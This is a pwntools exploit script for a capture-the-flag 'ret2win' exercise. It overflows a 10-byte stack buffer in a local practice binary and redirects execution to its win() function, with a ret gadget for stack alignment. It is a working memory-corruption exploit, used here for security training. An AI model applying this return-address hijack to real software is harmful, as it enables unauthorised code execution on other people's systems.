#!/usr/bin/env python3
# ret2win - classic stack overflow -> jump to win()
# buffer is 10 bytes at rbp-0xa, no canary, no PIE.
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/home/kzzz/Documents/code/ctf/ctf7/pwn/work/ret2win/main.out'
elf = ELF(BIN, checksec=False)

WIN = elf.symbols['win']
RET = 0x40101a          # bare `ret`, used to fix 16-byte stack alignment

OFFSET = 0xa + 8        # buf[10] + saved rbp

payload  = b'A' * OFFSET
payload += p64(RET)     # align rsp to 16 bytes for win()'s libc calls
payload += p64(WIN)

io = process(BIN, cwd='/home/kzzz/Documents/code/ctf/ctf7/pwn/work/ret2win')
io.sendlineafter(b'name?\n', payload)
print(io.recvall(timeout=2).decode(errors='replace'))
